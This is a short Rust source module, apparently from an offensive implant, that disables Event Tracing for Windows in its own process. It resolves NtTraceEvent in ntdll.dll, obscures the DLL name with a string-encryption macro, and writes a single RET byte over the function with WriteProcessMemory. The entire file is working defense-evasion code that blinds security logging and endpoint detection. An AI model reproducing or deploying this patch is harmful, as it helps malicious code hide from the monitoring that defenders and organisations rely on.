//! Module for patching ETW

use std::ffi::c_void;

use str_crypter::{decrypt_string, sc};
use windows_sys::Win32::System::{
    Diagnostics::Debug::WriteProcessMemory, Threading::GetCurrentProcess,
};

use crate::utils::export_resolver::{self, ExportResolveError};

pub fn patch_etw_current_process() -> Result<(), ExportResolveError> {
    let fn_addr =
        export_resolver::resolve_address(&sc!("ntdll.dll", 42).unwrap(), "NtTraceEvent", None)?;

    let handle = unsafe { GetCurrentProcess() };
    let ret_opcode: u8 = 0xC3;

    let size = std::mem::size_of_val(&ret_opcode);
    let mut bytes_written: usize = 0;

    let res = unsafe {
        WriteProcessMemory(
            handle,
            fn_addr,
            &ret_opcode as *const u8 as *const c_void,
            size,
            &mut bytes_written,
        )
    };

    Ok(())
}
